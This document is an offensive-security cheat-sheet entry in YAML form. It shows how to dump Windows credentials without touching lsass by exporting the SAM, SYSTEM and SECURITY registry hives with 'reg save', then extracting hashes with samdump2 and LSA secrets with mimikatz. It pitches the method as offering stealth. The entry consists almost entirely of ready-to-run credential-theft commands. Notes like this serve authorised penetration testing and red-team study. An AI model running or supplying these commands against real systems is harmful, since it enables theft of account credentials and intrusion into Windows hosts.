---
description: |
  The lsass Process while great, is no where neaar the only way to dump credintials from windows. One of which is access the three registry hives:
  SAM, SYSTEM, and SECURITY. This is a method that can be used to dump credentials without mimikatz as well as offer some potenial stealth.  

command: |
  # The following command will dump the SAM, SYSTEM, and SECURITY hives to the current directory.
  reg save HKLM\SAM sam.hive
  reg save HKLM\SYSTEM system.hive
  reg save HKLM\SECURITY security.hive

  #Assuming you have transfered the hives to your kali
  samdump2 system sam 

  #We can also get lsa secrets via mimikatz
  lsadump::secrets /system:c:\temp\system.hive /security:c:\temp\security.hive

items:
  - Shell
  - PrivEsc
  - Exploitation
OS:
  - Windows
  - Linux
references:
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping
  - https://www.synacktiv.com/en/publications/lsa-secrets-revisiting-secretsdump

---
